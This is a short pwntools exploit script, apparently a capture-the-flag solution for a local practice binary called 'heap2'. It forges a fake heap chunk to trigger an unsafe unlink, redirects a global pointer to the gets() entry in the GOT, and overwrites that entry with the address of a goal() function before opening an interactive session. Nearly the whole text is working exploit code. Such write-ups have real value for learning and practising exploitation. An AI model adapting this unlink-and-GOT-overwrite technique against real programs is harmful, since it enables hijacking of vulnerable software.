#!/usr/bin/env python

from pwn import *

context.arch='amd64'

r = process('./heap2')

loc_P = 0x601080     # &P
got_gets = 0x601038  # gets() entry in GOT
func_goal = 0x4006d6 # goal()

def do_write(data):
    print r.recvline()[:-1]
    r.send(data + '\n')

do_write(p64(0) + p64(240) + p64(loc_P - 24) + p64(loc_P - 16) + 'A'*208 + p64(240) + p64(256 | 0))
        # | 0   | size     | fd              | bk              |         | prevsize | size + 000  |

do_write('A'*24 + p64(got_gets))
        # P-24 .. ..  [  P  ]

do_write(p64(func_goal))
        # overwrite gets@GOT -> goal

r.interactive()
